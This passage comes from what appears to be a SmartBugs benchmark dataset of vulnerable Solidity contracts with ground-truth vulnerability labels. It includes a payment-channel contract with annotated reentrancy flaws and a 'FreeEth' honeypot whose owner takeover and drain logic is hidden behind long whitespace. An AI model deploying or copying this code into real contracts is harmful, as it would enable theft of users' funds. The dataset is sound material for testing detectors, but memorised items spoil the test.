102)) {\n             return uint(bresult[0]) - 87;\n         } else {\n             revert();\n         }\n     }\n\n     // @dev Converts a uint to a bytes32\n     // @thanks https://ethereum.stackexchange.com/questions/4170/how-to-convert-a-uint-to-bytes-in-solidity\n     function uintToBytes32(uint _uint) public pure returns (bytes b) {\n         b = new bytes(32);\n         assembly {mstore(add(b, 32), _uint)}\n     }\n\n     // @dev Hashes the signed message\n     // @ref https://github.com/ethereum/go-ethereum/issues/3731#issuecomment-293866868\n     function toEthereumSignedMessage(string _msg) public pure returns (bytes32) {\n         uint len = bytes(_msg).length;\n         require(len > 0);\n         bytes memory prefix = \"\\x19Ethereum Signed Message:\\n\";\n         return keccak256(abi.encodePacked(prefix, uintToString(len), _msg));\n     }\n\n     // @dev Converts a uint in a string\n     function uintToString(uint _uint) public pure returns (string str) {\n         uint len = 0;\n         uint m = _uint + 0;\n         while (m != 0) {\n             len++;\n             m /= 10;\n         }\n         bytes memory b = new bytes(len);\n         uint i = len - 1;\n         while (_uint != 0) {\n             uint remainder = _uint % 10;\n             _uint = _uint / 10;\n             b[i--] = byte(48 + remainder);\n         }\n         str = string(b);\n     }\n\n\n     // @dev extract a substring\n     // @thanks https://ethereum.stackexchange.com/questions/31457/substring-in-solidity\n     function substring(string _str, uint _startIndex, uint _endIndex) public pure returns (string) {\n         bytes memory strBytes = bytes(_str);\n         require(_startIndex <= _endIndex);\n         require(_startIndex >= 0);\n         require(_endIndex <= strBytes.length);\n\n         bytes memory result = new bytes(_endIndex - _startIndex);\n         for (uint i = _startIndex; i < _endIndex; i++) {\n             result[i - _startIndex] = strBytes[i];\n         }\n         return string(result);\n     }\n }\n contract StandardToken is Token {\n\n     function transfer(address _to, uint256 _value) public returns (bool success) {\n         //Default assumes totalSupply can't be over max (2^256 - 1).\n         //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n         //Replace the if with this one instead.\n         //require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n         require(balances[msg.sender] >= _value);\n         balances[msg.sender] -= _value;\n         balances[_to] += _value;\n         emit Transfer(msg.sender, _to, _value);\n         return true;\n     }\n\n     function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n         //same as above. Replace this line with the following if you want to protect against wrapping uints.\n         //require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n         require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n         balances[_to] += _value;\n         balances[_from] -= _value;\n         allowed[_from][msg.sender] -= _value;\n         emit Transfer(_from, _to, _value);\n         return true;\n     }\n\n     function balanceOf(address _owner) public constant returns (uint256 balance) {\n         return balances[_owner];\n     }\n\n     function approve(address _spender, uint256 _value) public returns (bool success) {\n         allowed[msg.sender][_spender] = _value;\n         emit Approval(msg.sender, _spender, _value);\n         return true;\n     }\n\n     function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n       return allowed[_owner][_spender];\n     }\n\n     mapping (address => uint256) balances;\n     mapping (address => mapping (address => uint256)) allowed;\n }\n\n contract HumanStandardToken is StandardToken {\n\n     /* Public variables of the token */\n\n     /*\n     NOTE:\n     The following variables are OPTIONAL vanities. One does not have to include them.\n     They allow one to customise the token contract & in no way influences the core functionality.\n     Some wallets/interfaces might not even bother to look at this information.\n     */\n     string public name;                   //fancy name: eg Simon Bucks\n     uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n     string public symbol;                 //An identifier: eg SBX\n     string public version = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.\n\n     constructor(\n         uint256 _initialAmount,\n         string _tokenName,\n         uint8 _decimalUnits,\n         string _tokenSymbol\n         ) public {\n         balances[msg.sender] = _initialAmount;               // Give the creator all initial tokens\n         totalSupply = _initialAmount;                        // Update total supply\n         name = _tokenName;                                   // Set the name for display purposes\n         decimals = _decimalUnits;                            // Amount of decimals for display purposes\n         symbol = _tokenSymbol;                               // Set the symbol for display purposes\n     }\n\n     /* Approves and then calls the receiving contract */\n     function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n         allowed[msg.sender][_spender] = _value;\n         emit Approval(msg.sender, _spender, _value);\n\n         //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n         //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n         //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n         require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n         return true;\n     }\n }\n\n contract LedgerChannel {\n\n     string public constant NAME = \"Ledger Channel\";\n     string public constant VERSION = \"0.0.1\";\n\n     uint256 public numChannels = 0;\n\n     event DidLCOpen (\n         bytes32 indexed channelId,\n         address indexed partyA,\n         address indexed partyI,\n         uint256 ethBalanceA,\n         address token,\n         uint256 tokenBalanceA,\n         uint256 LCopenTimeout\n     );\n\n     event DidLCJoin (\n         bytes32 indexed channelId,\n         uint256 ethBalanceI,\n         uint256 tokenBalanceI\n     );\n\n     event DidLCDeposit (\n         bytes32 indexed channelId,\n         address indexed recipient,\n         uint256 deposit,\n         bool isToken\n     );\n\n     event DidLCUpdateState (\n         bytes32 indexed channelId,\n         uint256 sequence,\n         uint256 numOpenVc,\n         uint256 ethBalanceA,\n         uint256 tokenBalanceA,\n         uint256 ethBalanceI,\n         uint256 tokenBalanceI,\n         bytes32 vcRoot,\n         uint256 updateLCtimeout\n     );\n\n     event DidLCClose (\n         bytes32 indexed channelId,\n         uint256 sequence,\n         uint256 ethBalanceA,\n         uint256 tokenBalanceA,\n         uint256 ethBalanceI,\n         uint256 tokenBalanceI\n     );\n\n     event DidVCInit (\n         bytes32 indexed lcId,\n         bytes32 indexed vcId,\n         bytes proof,\n         uint256 sequence,\n         address partyA,\n         address partyB,\n         uint256 balanceA,\n         uint256 balanceB\n     );\n\n     event DidVCSettle (\n         bytes32 indexed lcId,\n         bytes32 indexed vcId,\n         uint256 updateSeq,\n         uint256 updateBalA,\n         uint256 updateBalB,\n         address challenger,\n         uint256 updateVCtimeout\n     );\n\n     event DidVCClose(\n         bytes32 indexed lcId,\n         bytes32 indexed vcId,\n         uint256 balanceA,\n         uint256 balanceB\n     );\n\n     struct Channel {\n         //TODO: figure out if it's better just to split arrays by balances/deposits instead of eth/erc20\n         address[2] partyAddresses; // 0: partyA 1: partyI\n         uint256[4] ethBalances; // 0: balanceA 1:balanceI 2:depositedA 3:depositedI\n         uint256[4] erc20Balances; // 0: balanceA 1:balanceI 2:depositedA 3:depositedI\n         uint256[2] initialDeposit; // 0: eth 1: tokens\n         uint256 sequence;\n         uint256 confirmTime;\n         bytes32 VCrootHash;\n         uint256 LCopenTimeout;\n         uint256 updateLCtimeout; // when update LC times out\n         bool isOpen; // true when both parties have joined\n         bool isUpdateLCSettling;\n         uint256 numOpenVC;\n         HumanStandardToken token;\n     }\n\n     // virtual-channel state\n     struct VirtualChannel {\n         bool isClose;\n         bool isInSettlementState;\n         uint256 sequence;\n         address challenger; // Initiator of challenge\n         uint256 updateVCtimeout; // when update VC times out\n         // channel state\n         address partyA; // VC participant A\n         address partyB; // VC participant B\n         address partyI; // LC hub\n         uint256[2] ethBalances;\n         uint256[2] erc20Balances;\n         uint256[2] bond;\n         HumanStandardToken token;\n     }\n\n     mapping(bytes32 => VirtualChannel) public virtualChannels;\n     mapping(bytes32 => Channel) public Channels;\n\n     function createChannel(\n         bytes32 _lcID,\n         address _partyI,\n         uint256 _confirmTime,\n         address _token,\n         uint256[2] _balances // [eth, token]\n     )\n         public\n         payable\n     {\n         require(Channels[_lcID].partyAddresses[0] == address(0), \"Channel has already been created.\");\n         require(_partyI != 0x0, \"No partyI address provided to LC creation\");\n         require(_balances[0] >= 0 && _balances[1] >= 0, \"Balances cannot be negative\");\n         // Set initial ledger channel state\n         // Alice must execute this and we assume the initial state\n         // to be signed from this requirement\n         // Alternative is to check a sig as in joinChannel\n         Channels[_lcID].partyAddresses[0] = msg.sender;\n         Channels[_lcID].partyAddresses[1] = _partyI;\n\n         if(_balances[0] != 0) {\n             require(msg.value == _balances[0], \"Eth balance does not match sent value\");\n             Channels[_lcID].ethBalances[0] = msg.value;\n         }\n         if(_balances[1] != 0) {\n             Channels[_lcID].token = HumanStandardToken(_token);\n             require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"CreateChannel: token transfer failure\");\n             Channels[_lcID].erc20Balances[0] = _balances[1];\n         }\n\n         Channels[_lcID].sequence = 0;\n         Channels[_lcID].confirmTime = _confirmTime;\n         // is close flag, lc state sequence, number open vc, vc root hash, partyA...\n         //Channels[_lcID].stateHash = keccak256(uint256(0), uint256(0), uint256(0), bytes32(0x0), bytes32(msg.sender), bytes32(_partyI), balanceA, balanceI);\n         Channels[_lcID].LCopenTimeout = now + _confirmTime;\n         Channels[_lcID].initialDeposit = _balances;\n\n         emit DidLCOpen(_lcID, msg.sender, _partyI, _balances[0], _token, _balances[1], Channels[_lcID].LCopenTimeout);\n     }\n\n     function LCOpenTimeout(bytes32 _lcID) public {\n         require(msg.sender == Channels[_lcID].partyAddresses[0] && Channels[_lcID].isOpen == false);\n         require(now > Channels[_lcID].LCopenTimeout);\n\n         if(Channels[_lcID].initialDeposit[0] != 0) {\n             // <yes> <report> REENTRANCY\n             Channels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0]);\n         }\n         if(Channels[_lcID].initialDeposit[1] != 0) {\n             // <yes> <report> REENTRANCY\n             require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], Channels[_lcID].erc20Balances[0]),\"CreateChannel: token transfer failure\");\n         }\n\n         emit DidLCClose(_lcID, 0, Channels[_lcID].ethBalances[0], Channels[_lcID].erc20Balances[0], 0, 0);\n\n         // only safe to delete since no action was taken on this channel\n         delete Channels[_lcID];\n     }\n\n     function joinChannel(bytes32 _lcID, uint256[2] _balances) public payable {\n         // require the channel is not open yet\n         require(Channels[_lcID].isOpen == false);\n         require(msg.sender == Channels[_lcID].partyAddresses[1]);\n\n         if(_balances[0] != 0) {\n             require(msg.value == _balances[0], \"state balance does not match sent value\");\n             Channels[_lcID].ethBalances[1] = msg.value;\n         }\n         if(_balances[1] != 0) {\n             require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"joinChannel: token transfer failure\");\n             Channels[_lcID].erc20Balances[1] = _balances[1];\n         }\n\n         Channels[_lcID].initialDeposit[0]+=_balances[0];\n         Channels[_lcID].initialDeposit[1]+=_balances[1];\n         // no longer allow joining functions to be called\n         Channels[_lcID].isOpen = true;\n         numChannels++;\n\n         emit DidLCJoin(_lcID, _balances[0], _balances[1]);\n     }\n\n\n     // additive updates of monetary state\n     // TODO check this for attack vectors\n     function deposit(bytes32 _lcID, address recipient, uint256 _balance, bool isToken) public payable {\n         require(Channels[_lcID].isOpen == true, \"Tried adding funds to a closed channel\");\n         require(recipient == Channels[_lcID].partyAddresses[0] || recipient == Channels[_lcID].partyAddresses[1]);\n\n         //if(Channels[_lcID].token)\n\n         if (Channels[_lcID].partyAddresses[0] == recipient) {\n             if(isToken) {\n                 require(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\n                 Channels[_lcID].erc20Balances[2] += _balance;\n             } else {\n                 require(msg.value == _balance, \"state balance does not match sent value\");\n                 Channels[_lcID].ethBalances[2] += msg.value;\n             }\n         }\n\n         if (Channels[_lcID].partyAddresses[1] == recipient) {\n             if(isToken) {\n                 require(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\n                 Channels[_lcID].erc20Balances[3] += _balance;\n             } else {\n                 require(msg.value == _balance, \"state balance does not match sent value\");\n                 Channels[_lcID].ethBalances[3] += msg.value;\n             }\n         }\n\n         emit DidLCDeposit(_lcID, recipient, _balance, isToken);\n     }\n\n     // TODO: Check there are no open virtual channels, the client should have cought this before signing a close LC state update\n     function consensusCloseChannel(\n         bytes32 _lcID,\n         uint256 _sequence,\n         uint256[4] _balances, // 0: ethBalanceA 1:ethBalanceI 2:tokenBalanceA 3:tokenBalanceI\n         string _sigA,\n         string _sigI\n     )\n         public\n     {\n         // assume num open vc is 0 and root hash is 0x0\n         //require(Channels[_lcID].sequence < _sequence);\n         require(Channels[_lcID].isOpen == true);\n         uint256 totalEthDeposit = Channels[_lcID].initialDeposit[0] + Channels[_lcID].ethBalances[2] + Channels[_lcID].ethBalances[3];\n         uint256 totalTokenDeposit = Channels[_lcID].initialDeposit[1] + Channels[_lcID].erc20Balances[2] + Channels[_lcID].erc20Balances[3];\n         require(totalEthDeposit == _balances[0] + _balances[1]);\n         require(totalTokenDeposit == _balances[2] + _balances[3]);\n\n         bytes32 _state = keccak256(\n             abi.encodePacked(\n                 _lcID,\n                 true,\n                 _sequence,\n                 uint256(0),\n                 bytes32(0x0),\n                 Channels[_lcID].partyAddresses[0],\n                 Channels[_lcID].partyAddresses[1],\n                 _balances[0],\n                 _balances[1],\n                 _balances[2],\n                 _balances[3]\n             )\n         );\n\n         require(Channels[_lcID].partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\n         require(Channels[_lcID].partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\n\n         Channels[_lcID].isOpen = false;\n\n         if(_balances[0] != 0 || _balances[1] != 0) {\n             Channels[_lcID].partyAddresses[0].transfer(_balances[0]);\n             Channels[_lcID].partyAddresses[1].transfer(_balances[1]);\n         }\n\n         if(_balances[2] != 0 || _balances[3] != 0) {\n             require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], _balances[2]),\"happyCloseChannel: token transfer failure\");\n             require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[1], _balances[3]),\"happyCloseChannel: token transfer failure\");\n         }\n\n         numChannels--;\n\n         emit DidLCClose(_lcID, _sequence, _balances[0], _balances[1], _balances[2], _balances[3]);\n     }\n\n     // Byzantine functions\n\n     function updateLCstate(\n         bytes32 _lcID,\n         uint256[6] updateParams, // [sequence, numOpenVc, ethbalanceA, ethbalanceI, tokenbalanceA, tokenbalanceI]\n         bytes32 _VCroot,\n         string _sigA,\n         string _sigI\n     )\n         public\n     {\n         Channel storage channel = Channels[_lcID];\n         require(channel.isOpen);\n         require(channel.sequence < updateParams[0]); // do same as vc sequence check\n         require(channel.ethBalances[0] + channel.ethBalances[1] >= updateParams[2] + updateParams[3]);\n         require(channel.erc20Balances[0] + channel.erc20Balances[1] >= updateParams[4] + updateParams[5]);\n\n         if(channel.isUpdateLCSettling == true) {\n             require(channel.updateLCtimeout > now);\n         }\n\n         bytes32 _state = keccak256(\n             abi.encodePacked(\n                 _lcID,\n                 false,\n                 updateParams[0],\n                 updateParams[1],\n                 _VCroot,\n                 channel.partyAddresses[0],\n                 channel.partyAddresses[1],\n                 updateParams[2],\n                 updateParams[3],\n                 updateParams[4],\n                 updateParams[5]\n             )\n         );\n\n         require(channel.partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\n         require(channel.partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\n\n         // update LC state\n         channel.sequence = updateParams[0];\n         channel.numOpenVC = updateParams[1];\n         channel.ethBalances[0] = updateParams[2];\n         channel.ethBalances[1] = updateParams[3];\n         channel.erc20Balances[0] = updateParams[4];\n         channel.erc20Balances[1] = updateParams[5];\n         channel.VCrootHash = _VCroot;\n         channel.isUpdateLCSettling = true;\n         channel.updateLCtimeout = now + channel.confirmTime;\n\n         // make settlement flag\n\n         emit DidLCUpdateState (\n             _lcID,\n             updateParams[0],\n             updateParams[1],\n             updateParams[2],\n             updateParams[3],\n             updateParams[4],\n             updateParams[5],\n             _VCroot,\n             channel.updateLCtimeout\n         );\n     }\n\n     // supply initial state of VC to \"prime\" the force push game\n     function initVCstate(\n         bytes32 _lcID,\n         bytes32 _vcID,\n         bytes _proof,\n         address _partyA,\n         address _partyB,\n         uint256[2] _bond,\n         uint256[4] _balances, // 0: ethBalanceA 1:ethBalanceI 2:tokenBalanceA 3:tokenBalanceI\n         string sigA\n     )\n         public\n     {\n         require(Channels[_lcID].isOpen, \"LC is closed.\");\n         // sub-channel must be open\n         require(!virtualChannels[_vcID].isClose, \"VC is closed.\");\n         // Check time has passed on updateLCtimeout and has not passed the time to store a vc state\n         require(Channels[_lcID].updateLCtimeout < now, \"LC timeout not over.\");\n         // prevent rentry of initializing vc state\n         require(virtualChannels[_vcID].updateVCtimeout == 0);\n         // partyB is now Ingrid\n         bytes32 _initState = keccak256(\n             abi.encodePacked(_vcID, uint256(0), _partyA, _partyB, _bond[0], _bond[1], _balances[0], _balances[1], _balances[2], _balances[3])\n         );\n\n         // Make sure Alice has signed initial vc state (A/B in oldState)\n         require(_partyA == ECTools.recoverSigner(_initState, sigA));\n\n         // Check the oldState is in the root hash\n         require(_isContained(_initState, _proof, Channels[_lcID].VCrootHash) == true);\n\n         virtualChannels[_vcID].partyA = _partyA; // VC participant A\n         virtualChannels[_vcID].partyB = _partyB; // VC participant B\n         virtualChannels[_vcID].sequence = uint256(0);\n         virtualChannels[_vcID].ethBalances[0] = _balances[0];\n         virtualChannels[_vcID].ethBalances[1] = _balances[1];\n         virtualChannels[_vcID].erc20Balances[0] = _balances[2];\n         virtualChannels[_vcID].erc20Balances[1] = _balances[3];\n         virtualChannels[_vcID].bond = _bond;\n         virtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\n         virtualChannels[_vcID].isInSettlementState = true;\n\n         emit DidVCInit(_lcID, _vcID, _proof, uint256(0), _partyA, _partyB, _balances[0], _balances[1]);\n     }\n\n     //TODO: verify state transition since the hub did not agree to this state\n     // make sure the A/B balances are not beyond ingrids bonds\n     // Params: vc init state, vc final balance, vcID\n     function settleVC(\n         bytes32 _lcID,\n         bytes32 _vcID,\n         uint256 updateSeq,\n         address _partyA,\n         address _partyB,\n         uint256[4] updateBal, // [ethupdateBalA, ethupdateBalB, tokenupdateBalA, tokenupdateBalB]\n         string sigA\n     )\n         public\n     {\n         require(Channels[_lcID].isOpen, \"LC is closed.\");\n         // sub-channel must be open\n         require(!virtualChannels[_vcID].isClose, \"VC is closed.\");\n         require(virtualChannels[_vcID].sequence < updateSeq, \"VC sequence is higher than update sequence.\");\n         require(\n             virtualChannels[_vcID].ethBalances[1] < updateBal[1] && virtualChannels[_vcID].erc20Balances[1] < updateBal[3],\n             \"State updates may only increase recipient balance.\"\n         );\n         require(\n             virtualChannels[_vcID].bond[0] == updateBal[0] + updateBal[1] &&\n             virtualChannels[_vcID].bond[1] == updateBal[2] + updateBal[3],\n             \"Incorrect balances for bonded amount\");\n         // Check time has passed on updateLCtimeout and has not passed the time to store a vc state\n         // virtualChannels[_vcID].updateVCtimeout should be 0 on uninitialized vc state, and this should\n         // fail if initVC() isn't called first\n         // require(Channels[_lcID].updateLCtimeout < now && now < virtualChannels[_vcID].updateVCtimeout);\n         require(Channels[_lcID].updateLCtimeout < now); // for testing!\n\n         bytes32 _updateState = keccak256(\n             abi.encodePacked(\n                 _vcID,\n                 updateSeq,\n                 _partyA,\n                 _partyB,\n                 virtualChannels[_vcID].bond[0],\n                 virtualChannels[_vcID].bond[1],\n                 updateBal[0],\n                 updateBal[1],\n                 updateBal[2],\n                 updateBal[3]\n             )\n         );\n\n         // Make sure Alice has signed a higher sequence new state\n         require(virtualChannels[_vcID].partyA == ECTools.recoverSigner(_updateState, sigA));\n\n         // store VC data\n         // we may want to record who is initiating on-chain settles\n         virtualChannels[_vcID].challenger = msg.sender;\n         virtualChannels[_vcID].sequence = updateSeq;\n\n         // channel state\n         virtualChannels[_vcID].ethBalances[0] = updateBal[0];\n         virtualChannels[_vcID].ethBalances[1] = updateBal[1];\n         virtualChannels[_vcID].erc20Balances[0] = updateBal[2];\n         virtualChannels[_vcID].erc20Balances[1] = updateBal[3];\n\n         virtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\n\n         emit DidVCSettle(_lcID, _vcID, updateSeq, updateBal[0], updateBal[1], msg.sender, virtualChannels[_vcID].updateVCtimeout);\n     }\n\n     function closeVirtualChannel(bytes32 _lcID, bytes32 _vcID) public {\n         // require(updateLCtimeout > now)\n         require(Channels[_lcID].isOpen, \"LC is closed.\");\n         require(virtualChannels[_vcID].isInSettlementState, \"VC is not in settlement state.\");\n         require(virtualChannels[_vcID].updateVCtimeout < now, \"Update vc timeout has not elapsed.\");\n         require(!virtualChannels[_vcID].isClose, \"VC is already closed\");\n         // reduce the number of open virtual channels stored on LC\n         Channels[_lcID].numOpenVC--;\n         // close vc flags\n         virtualChannels[_vcID].isClose = true;\n         // re-introduce the balances back into the LC state from the settled VC\n         // decide if this lc is alice or bob in the vc\n         if(virtualChannels[_vcID].partyA == Channels[_lcID].partyAddresses[0]) {\n             Channels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[0];\n             Channels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[1];\n\n             Channels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[0];\n             Channels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[1];\n         } else if (virtualChannels[_vcID].partyB == Channels[_lcID].partyAddresses[0]) {\n             Channels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[1];\n             Channels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[0];\n\n             Channels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[1];\n             Channels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[0];\n         }\n\n         emit DidVCClose(_lcID, _vcID, virtualChannels[_vcID].erc20Balances[0], virtualChannels[_vcID].erc20Balances[1]);\n     }\n\n\n     // todo: allow ethier lc.end-user to nullify the settled LC state and return to off-chain\n     function byzantineCloseChannel(bytes32 _lcID) public {\n         Channel storage channel = Channels[_lcID];\n\n         // check settlement flag\n         require(channel.isOpen, \"Channel is not open\");\n         require(channel.isUpdateLCSettling == true);\n         require(channel.numOpenVC == 0);\n         require(channel.updateLCtimeout < now, \"LC timeout over.\");\n\n         // if off chain state update didnt reblance deposits, just return to deposit owner\n         uint256 totalEthDeposit = channel.initialDeposit[0] + channel.ethBalances[2] + channel.ethBalances[3];\n         uint256 totalTokenDeposit = channel.initialDeposit[1] + channel.erc20Balances[2] + channel.erc20Balances[3];\n\n         uint256 possibleTotalEthBeforeDeposit = channel.ethBalances[0] + channel.ethBalances[1];\n         uint256 possibleTotalTokenBeforeDeposit = channel.erc20Balances[0] + channel.erc20Balances[1];\n\n         if(possibleTotalEthBeforeDeposit < totalEthDeposit) {\n             channel.ethBalances[0]+=channel.ethBalances[2];\n             channel.ethBalances[1]+=channel.ethBalances[3];\n         } else {\n             require(possibleTotalEthBeforeDeposit == totalEthDeposit);\n         }\n\n         if(possibleTotalTokenBeforeDeposit < totalTokenDeposit) {\n             channel.erc20Balances[0]+=channel.erc20Balances[2];\n             channel.erc20Balances[1]+=channel.erc20Balances[3];\n         } else {\n             require(possibleTotalTokenBeforeDeposit == totalTokenDeposit);\n         }\n\n         // reentrancy\n         uint256 ethbalanceA = channel.ethBalances[0];\n         uint256 ethbalanceI = channel.ethBalances[1];\n         uint256 tokenbalanceA = channel.erc20Balances[0];\n         uint256 tokenbalanceI = channel.erc20Balances[1];\n\n         channel.ethBalances[0] = 0;\n         channel.ethBalances[1] = 0;\n         channel.erc20Balances[0] = 0;\n         channel.erc20Balances[1] = 0;\n\n         if(ethbalanceA != 0 || ethbalanceI != 0) {\n             channel.partyAddresses[0].transfer(ethbalanceA);\n             channel.partyAddresses[1].transfer(ethbalanceI);\n         }\n\n         if(tokenbalanceA != 0 || tokenbalanceI != 0) {\n             require(\n                 channel.token.transfer(channel.partyAddresses[0], tokenbalanceA),\n                 \"byzantineCloseChannel: token transfer failure\"\n             );\n             require(\n                 channel.token.transfer(channel.partyAddresses[1], tokenbalanceI),\n                 \"byzantineCloseChannel: token transfer failure\"\n             );\n         }\n\n         channel.isOpen = false;\n         numChannels--;\n\n         emit DidLCClose(_lcID, channel.sequence, ethbalanceA, ethbalanceI, tokenbalanceA, tokenbalanceI);\n     }\n\n     function _isContained(bytes32 _hash, bytes _proof, bytes32 _root) internal pure returns (bool) {\n         bytes32 cursor = _hash;\n         bytes32 proofElem;\n\n         for (uint256 i = 64; i <= _proof.length; i += 32) {\n             assembly { proofElem := mload(add(_proof, i)) }\n\n             if (cursor < proofElem) {\n                 cursor = keccak256(abi.encodePacked(cursor, proofElem));\n             } else {\n                 cursor = keccak256(abi.encodePacked(proofElem, cursor));\n             }\n         }\n\n         return cursor == _root;\n     }\n\n     //Struct Getters\n     function getChannel(bytes32 id) public view returns (\n         address[2],\n         uint256[4],\n         uint256[4],\n         uint256[2],\n         uint256,\n         uint256,\n         bytes32,\n         uint256,\n         uint256,\n         bool,\n         bool,\n         uint256\n     ) {\n         Channel memory channel = Channels[id];\n         return (\n             channel.partyAddresses,\n             channel.ethBalances,\n             channel.erc20Balances,\n             channel.initialDeposit,\n             channel.sequence,\n             channel.confirmTime,\n             channel.VCrootHash,\n             channel.LCopenTimeout,\n             channel.updateLCtimeout,\n             channel.isOpen,\n             channel.isUpdateLCSettling,\n             channel.numOpenVC\n         );\n     }\n\n     function getVirtualChannel(bytes32 id) public view returns(\n         bool,\n         bool,\n         uint256,\n         address,\n         uint256,\n         address,\n         address,\n         address,\n         uint256[2],\n         uint256[2],\n         uint256[2]\n     ) {\n         VirtualChannel memory virtualChannel = virtualChannels[id];\n         return(\n             virtualChannel.isClose,\n             virtualChannel.isInSettlementState,\n             virtualChannel.sequence,\n             virtualChannel.challenger,\n             virtualChannel.updateVCtimeout,\n             virtualChannel.partyA,\n             virtualChannel.partyB,\n             virtualChannel.partyI,\n             virtualChannel.ethBalances,\n             virtualChannel.erc20Balances,\n             virtualChannel.bond\n         );\n     }\n }\n",
    "num_lines": 897,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xdb1c55f6926e7d847ddf8678905ad871a68199d2",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 39\n */\n\npragma solidity ^0.4.19;\n\ncontract FreeEth\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "num_lines": 41,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xe09b1ab8111c2729a76f16de96bc86a7af837928",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xe09b1ab8111c2729a76f16de96bc86a7af837928.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 150\n */\n\npragma solidity ^0.4.24;\n\n/* This is fiftyflip \na simple yet elegant game contract \nthat is connected to Proof of Community \ncontract(0x1739e311ddBf1efdFbc39b74526Fd8b600755ADa).\n\nGreed serves no-one but the one, \nBut charity is kind, suffereth not and envieth not. \nCharity is to give of oneself in the service of his fellow beings. \n\nPlay on Players. and Remember fifty feeds the multiudes and gives to the PoC community\nForever and ever. \n\n\n*/\n\n\ncontract FiftyFlip {\n    uint constant DONATING_X = 20; // 2% kujira\n\n    // Need to be discussed\n    uint constant JACKPOT_FEE = 10; // 1% jackpot\n    uint constant JACKPOT_MODULO = 1000; // 0.1% jackpotwin\n    uint constant DEV_FEE = 20; // 2% devfee\n    uint constant WIN_X = 1900; // 1.9x\n\n    // There is minimum and maximum bets.\n    uint constant MIN_BET = 0.01 ether;\n    uint constant MAX_BET = 1 ether;\n\n    uint constant BET_EXPIRATION_BLOCKS = 250;\n\n    // owner and PoC contract address\n    address public owner;\n    address public autoPlayBot;\n    address public secretSigner;\n    address private whale;\n\n    // Accumulated jackpot fund.\n    uint256 public jackpotSize;\n    uint256 public devFeeSize;\n\n    // Funds that are locked in potentially winning bets.\n    uint256 public lockedInBets;\n    uint256 public totalAmountToWhale;\n\n\n    struct Bet {\n        // Wager amount in wei.\n        uint amount;\n        // Block number of placeBet tx.\n        uint256 blockNumber;\n        // Bit mask representing winning bet outcomes (see MAX_MASK_MODULO comment).\n        bool betMask;\n        // Address of a player, used to pay out winning bets.\n        address player;\n    }\n\n    mapping (uint => Bet) bets;\n    mapping (address => uint) donateAmount;\n\n    // events\n    event Wager(uint ticketID, uint betAmount, uint256 betBlockNumber, bool betMask, address betPlayer);\n    event 